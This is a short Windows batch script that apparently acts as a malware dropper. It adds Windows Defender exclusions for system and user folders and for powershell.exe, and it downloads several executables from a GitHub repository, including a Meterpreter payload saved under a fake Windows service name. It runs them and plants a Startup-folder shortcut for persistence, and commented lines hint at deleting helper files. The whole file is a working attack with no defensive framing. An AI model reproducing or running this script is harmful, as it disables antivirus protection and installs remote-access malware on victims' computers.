@echo off
powershell Add-MpPreference -ExclusionPath "C:\Temp"
powershell Add-MpPreference -ExclusionPath "C:\Windows"
powershell -Command Add-MpPreference -ExclusionProcess "powershell.exe"
powershell Add-MpPreference -ExclusionPath "C:\Users\Public"
powershell Add-MpPreference -ExclusionPath "C:\Users\$([Environment]::UserName)\AppData\Local"
powershell Add-MpPreference -ExclusionPath "C:\Users\Public\AppData\Local"
curl --output "C:\Users\Public\gui.exe" -LJO https://github.com/durandlh/windows-crypto/blob/main/new-revision/gui.exe?raw=true
powershell Add-MpPreference -ExclusionPath "C:\Users\Public\gui.exe"
cd C:\Users\Public\
powershell.exe start gui.exe
curl --output "C:\Users\Public\Windows Notification Service for Special Apps.exe" -LJO https://github.com/durandlh/windows-crypto/blob/main/new-revision/meterpreter_2.exe?raw=true
powershell Add-MpPreference -ExclusionPath "C:\Users\Public\Windows Notification Service for Special Apps.exe"
curl --output "C:\Users\Public\persistent.exe" -LJO https://github.com/durandlh/windows-crypto/blob/main/new-revision/persistent.exe?raw=true
powershell Add-MpPreference -ExclusionPath "C:\Users\Public\persistent.exe"

powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\helper.lnk');$s.TargetPath='C:\Users\Public\persistent.exe';$s.Save()"

powershell.exe start "C:\Users\Public\persistent.exe"
timeout /t 5
:: del dependencies.bat
:: del hide.vbs 
